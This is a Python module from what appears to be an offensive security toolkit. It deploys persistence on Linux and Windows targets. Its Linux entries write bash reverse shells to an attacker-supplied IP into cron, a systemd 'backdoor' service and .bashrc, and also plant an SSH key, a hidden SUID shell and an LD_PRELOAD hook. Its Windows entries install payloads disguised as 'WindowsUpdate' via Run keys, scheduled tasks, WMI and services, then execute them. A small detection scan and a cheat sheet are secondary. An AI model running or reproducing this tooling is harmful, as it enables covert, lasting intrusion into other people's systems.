"""Persistence Module - Linux and Windows persistence techniques for maintaining access."""

import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))

from ui import (console, show_stage_header, show_menu, ask, info, success,
                warning, error, confirm, show_results_panel, show_knowledge)
from executor import run_with_preview, run_command

STAGE = "persist"

LINUX_PERSISTENCE = {
    "Cron Job": {
        "desc": "Add reverse shell to crontab",
        "check": "crontab -l",
        "commands": [
            '(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c \'bash -i >& /dev/tcp/{attacker}/{port} 0>&1\'") | crontab -',
        ],
        "cleanup": "crontab -l | grep -v '{attacker}' | crontab -",
    },
    "Systemd Service": {
        "desc": "Create persistent systemd service",
        "check": "systemctl list-unit-files --type=service | grep backdoor",
        "commands": [
            'cat > /etc/systemd/system/backdoor.service << EOF\n[Unit]\nDescription=System Update Service\n[Service]\nType=simple\nExecStart=/bin/bash -c "bash -i >& /dev/tcp/{attacker}/{port} 0>&1"\nRestart=always\nRestartSec=60\n[Install]\nWantedBy=multi-user.target\nEOF',
            "systemctl daemon-reload",
            "systemctl enable backdoor.service",
            "systemctl start backdoor.service",
        ],
        "cleanup": "systemctl stop backdoor.service && systemctl disable backdoor.service && rm /etc/systemd/system/backdoor.service",
    },
    ".bashrc Backdoor": {
        "desc": "Add reverse shell to user's .bashrc",
        "check": "cat ~/.bashrc | tail -5",
        "commands": [
            'echo \'bash -i >& /dev/tcp/{attacker}/{port} 0>&1 &\' >> ~/.bashrc',
        ],
        "cleanup": "Edit ~/.bashrc and remove the line",
    },
    "SSH Authorized Keys": {
        "desc": "Add your SSH public key for persistent access",
        "check": "cat ~/.ssh/authorized_keys",
        "commands": [
            "mkdir -p ~/.ssh && chmod 700 ~/.ssh",
            'echo "{ssh_pubkey}" >> ~/.ssh/authorized_keys',
            "chmod 600 ~/.ssh/authorized_keys",
        ],
        "cleanup": "Remove the added key from ~/.ssh/authorized_keys",
    },
    "SUID Binary": {
        "desc": "Create SUID binary for privilege escalation",
        "check": "find / -perm -4000 -type f 2>/dev/null | head -20",
        "commands": [
            "cp /bin/bash /tmp/.hidden_bash",
            "chmod u+s /tmp/.hidden_bash",
        ],
        "cleanup": "rm /tmp/.hidden_bash",
    },
    "LD_PRELOAD": {
        "desc": "Hijack library loading for code execution",
        "check": "cat /etc/ld.so.preload",
        "commands": [
            "# Compile: gcc -shared -fPIC -o /tmp/.libhook.so hook.c",
            'echo "/tmp/.libhook.so" >> /etc/ld.so.preload',
        ],
        "cleanup": "Remove entry from /etc/ld.so.preload and delete .so",
    },
}

WINDOWS_PERSISTENCE = {
    "Registry Run Key": {
        "desc": "Auto-start payload on user login",
        "check": 'reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"',
        "commands": [
            'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\\Users\\Public\\payload.exe" /f',
        ],
        "cleanup": 'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /f',
    },
    "Scheduled Task": {
        "desc": "Create scheduled task for persistence",
        "check": "schtasks /query /tn WindowsUpdate",
        "commands": [
            'schtasks /create /tn "WindowsUpdate" /tr "C:\\Users\\Public\\payload.exe" /sc onlogon /ru System /f',
        ],
        "cleanup": 'schtasks /delete /tn "WindowsUpdate" /f',
    },
    "WMI Event Subscription": {
        "desc": "WMI-based persistence (survives reboots)",
        "check": "Get-WMIObject -Namespace root\\Subscription -Class __EventFilter",
        "commands": [
            """powershell -c "$filter = Set-WmiInstance -Namespace 'root\\subscription' -Class __EventFilter -Arguments @{Name='BackdoorFilter';EventNamespace='root\\cimv2';QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \\'Win32_PerfFormattedData_PerfOS_System\\''}"
$consumer = Set-WmiInstance -Namespace 'root\\subscription' -Class CommandLineEventConsumer -Arguments @{Name='BackdoorConsumer';CommandLineTemplate='C:\\Users\\Public\\payload.exe'}
Set-WmiInstance -Namespace 'root\\subscription' -Class __FilterToConsumerBinding -Arguments @{Filter=$filter;Consumer=$consumer}""",
        ],
        "cleanup": "Remove WMI filter, consumer, and binding objects",
    },
    "Windows Service": {
        "desc": "Install as Windows service",
        "check": "sc query WindowsUpdateSvc",
        "commands": [
            'sc create WindowsUpdateSvc binPath= "C:\\Users\\Public\\payload.exe" start= auto DisplayName= "Windows Update Service"',
            "sc start WindowsUpdateSvc",
        ],
        "cleanup": "sc stop WindowsUpdateSvc && sc delete WindowsUpdateSvc",
    },
    "Startup Folder": {
        "desc": "Drop payload in Startup folder",
        "check": 'dir "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"',
        "commands": [
            'copy payload.exe "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.exe"',
        ],
        "cleanup": 'del "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.exe"',
    },
    "DLL Hijacking": {
        "desc": "Place malicious DLL in application search path",
        "check": "# Use Process Monitor to find DLL search order gaps",
        "commands": [
            "# 1. Find vulnerable app with missing DLL (Process Monitor: NAME NOT FOUND)",
            "# 2. Create DLL with same name",
            "# 3. Place in application directory or PATH",
        ],
        "cleanup": "Remove the malicious DLL",
    },
}


def _run_persistence(techniques, platform_name, session):
    """Generic persistence technique runner."""
    options = [(str(i+1), f"[bold]{name}[/bold] - {t['desc']}") for i, (name, t) in enumerate(techniques.items())]
    options.append(("0", "[bold]Back[/bold]"))
    choice = show_menu(options)

    if choice == "0":
        return

    idx = int(choice) - 1
    techs = list(techniques.items())
    if 0 <= idx < len(techs):
        name, tech = techs[idx]
        console.print(f"\n[bold cyan]{platform_name} Persistence: {name}[/bold cyan]")
        console.print(f"  [dim]{tech['desc']}[/dim]\n")

        # Collect parameters
        params = {}
        for cmd in tech["commands"]:
            if "{attacker}" in cmd and "attacker" not in params:
                params["attacker"] = ask("Enter attacker IP")
            if "{port}" in cmd and "port" not in params:
                params["port"] = ask("Enter callback port", default="4444")
            if "{ssh_pubkey}" in cmd and "ssh_pubkey" not in params:
                params["ssh_pubkey"] = ask("Enter your SSH public key")

        info(f"Check current state:")
        run_with_preview(tech["check"], session, STAGE)

        if confirm(f"Deploy {name} persistence?"):
            for cmd in tech["commands"]:
                try:
                    cmd = cmd.format(**params)
                except KeyError:
                    pass
                run_with_preview(cmd, session, STAGE)

        info(f"Cleanup command: {tech['cleanup']}")


def _detect_persistence(session):
    """Check for common persistence mechanisms on current system."""
    info("Scanning for common persistence mechanisms...")

    checks = [
        ("Cron jobs", "crontab -l 2>/dev/null; ls -la /etc/cron* 2>/dev/null"),
        ("Systemd services", "systemctl list-unit-files --state=enabled --type=service 2>/dev/null | tail -20"),
        ("SSH authorized keys", "cat ~/.ssh/authorized_keys 2>/dev/null"),
        ("SUID binaries", "find /tmp /var/tmp /dev/shm -perm -4000 -type f 2>/dev/null"),
        ("LD_PRELOAD", "cat /etc/ld.so.preload 2>/dev/null"),
        (".bashrc check", "tail -5 ~/.bashrc 2>/dev/null"),
    ]

    for name, cmd in checks:
        console.print(f"\n[bold cyan]Checking: {name}[/bold cyan]")
        run_command(cmd, timeout=10)


def _cheat_sheet():
    content = """# Persistence Cheat Sheet

## Linux
```
# Cron
(crontab -l; echo "* * * * * /path/to/shell") | crontab -

# Systemd
systemctl enable backdoor.service

# SSH keys
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys

# SUID
cp /bin/bash /tmp/.bash; chmod u+s /tmp/.bash
/tmp/.bash -p  # Run with privs
```

## Windows
```
# Registry Run
reg add HKCU\\...\\Run /v name /d payload.exe

# Scheduled Task
schtasks /create /tn name /tr payload.exe /sc onlogon

# Service
sc create name binPath= payload.exe start= auto

# WMI Event Sub (stealthy)
# Uses WQL event filter + CommandLine consumer
```

## MITRE ATT&CK Persistence Techniques
- T1053: Scheduled Task/Job
- T1547: Boot/Logon Autostart
- T1546: Event Triggered Execution
- T1543: Create/Modify System Process
- T1098: Account Manipulation
"""
    show_knowledge(content)


def run(session):
    """Persistence module entry point."""
    show_stage_header("Persistence", "Linux & Windows persistence techniques for maintaining access")

    while True:
        options = [
            ("1", "[bold]Linux Persistence[/bold]  - Cron, systemd, SSH, SUID"),
            ("2", "[bold]Windows Persistence[/bold]- Registry, tasks, WMI, services"),
            ("3", "[bold]Detect Persistence[/bold] - Scan current system"),
            ("4", "[bold]Cheat Sheet[/bold]        - Persistence reference"),
            ("0", "[bold]Back to Main Menu[/bold]"),
        ]
        choice = show_menu(options)

        if choice == "0":
            return
        elif choice == "1":
            _run_persistence(LINUX_PERSISTENCE, "Linux", session)
        elif choice == "2":
            _run_persistence(WINDOWS_PERSISTENCE, "Windows", session)
        elif choice == "3":
            _detect_persistence(session)
        elif choice == "4":
            _cheat_sheet()
